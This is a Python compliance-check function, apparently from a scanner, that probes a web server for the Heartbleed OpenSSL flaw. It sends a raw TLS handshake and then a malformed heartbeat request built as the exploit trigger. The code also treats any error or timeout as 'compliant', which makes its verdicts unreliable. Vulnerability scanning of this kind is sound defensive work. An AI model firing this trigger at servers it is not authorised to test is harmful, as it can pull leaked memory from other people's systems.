import socket
import struct

def run_check(target_url):
    """
    Compliance Check: Heartbleed Vulnerability
    - Probes for the Heartbeat extension flaw in OpenSSL.
    - Success: Server is not vulnerable or Heartbeat is disabled (Compliant - Y).
    - Failure: Server responds with memory data (Not Compliant - N).
    """
    host = target_url.replace("https://", "").replace("http://", "").split('/')[0]
    port = 443

    # This is a simplified Heartbleed "Hello" probe
    # It sends a TLS Heartbeat request with a payload length larger than the actual payload
    heartbeat_payload = (
        b"\x18\x03\x02\x00\x03"  # Heartbeat record header
        b"\x01"                  # Heartbeat request
        b"\x40\x00"              # Claimed length (16KB) - the exploit trigger
    )

    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            # Basic TLS Client Hello to start the handshake
            sock.send(b"\x16\x03\x02\x00\xdc\x01\x00\x00\xd8\x03\x02\x53\x43\x5b\x90\x9d\x9b\x72\x0b\xbc\x0c\xbc\x2b\x92\xa8\x48\x97\xcf\xbd\x39\x04\xcc\x16\x0a\x85\x03\x90\x9f\x77\x04\x33\xd4\xde\x00\x00\x66\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00\x0a\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e\x00\x33\x00\x32\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x0e\xc0\x04\x00\x2f\x00\x96\x00\x41\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00\x00\x49\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x01\x01")
            
            # Receive Server Hello (just to clear buffer)
            sock.recv(1024)
            
            # Send the malicious Heartbeat request
            sock.send(heartbeat_payload)
            
            # Wait for response
            response = sock.recv(1024)
            
            # If the server responds with a heartbeat response (type 0x18) 
            # and the length of the data exceeds what we sent, it is leaking memory.
            if response and response[0] == 24: # 24 is 0x18 (Heartbeat)
                return {
                    "check_name": "Heartbleed Vulnerability",
                    "compliance": "N",
                    "remark": "NOT COMPLIANT: Server is vulnerable to Heartbleed. It allowed a memory-leaking heartbeat response. N",
                    "severity": "high" # Red
                }

        return {
            "check_name": "Heartbleed Vulnerability",
            "compliance": "Y",
            "remark": "Compliant: Server is not vulnerable to Heartbleed. Heartbeat requests are correctly handled or disabled. Y",
            "severity": "info" # Green
        }

    except Exception:
        # Most secure servers will just drop the connection or timeout, which is good.
        return {
            "check_name": "Heartbleed Vulnerability",
            "compliance": "Y",
            "remark": "Compliant: Connection dropped or refused when testing for Heartbleed. Site is protected. Y",
            "severity": "info"
        }